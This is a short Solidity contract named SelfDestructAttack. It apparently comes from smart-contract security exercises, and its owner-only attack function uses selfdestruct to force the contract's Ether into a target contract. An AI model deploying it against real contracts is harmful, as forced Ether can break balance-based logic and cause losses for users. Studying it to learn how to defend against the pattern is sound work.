// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract SelfDestructAttack is Ownable {
    constructor(address initialOwner) payable Ownable(initialOwner) {}

    receive() external payable {}

    // The selfdestruct opcode has been deprecated in Solidity version 0.8.18, as recommended by EIP-6049
    function attack(address _contractAddress) external onlyOwner {
        selfdestruct(payable(_contractAddress));
    }
}